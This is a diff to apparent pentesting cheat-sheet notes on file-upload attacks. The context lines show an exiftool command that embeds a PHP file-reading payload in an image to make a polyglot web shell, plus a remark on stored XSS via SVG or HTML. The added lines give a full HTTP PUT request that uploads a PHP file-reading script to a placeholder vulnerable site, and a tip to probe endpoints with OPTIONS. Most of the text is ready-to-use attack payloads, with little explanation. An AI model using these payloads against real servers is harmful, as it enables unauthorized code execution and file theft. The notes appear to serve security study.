@@ -22,3 +22,18 @@ Polyglot web shell upload :
       exiftool -Comment="<?php echo 'START ' . file_get_contents('/file') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 
 If you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads.
+
+
+Uploading files using PUT :
+      PUT /images/exploit.php HTTP/1.1
+      Host: vulnerable-website.com
+      Content-Type: application/x-httpd-php
+      Content-Length: 49
+      
+      <?php echo file_get_contents('/path/to/file'); ?>
+
+
+Tip :
+      You can try sending OPTIONS requests to different endpoints to test for any that advertise support for the PUT method.
+
+
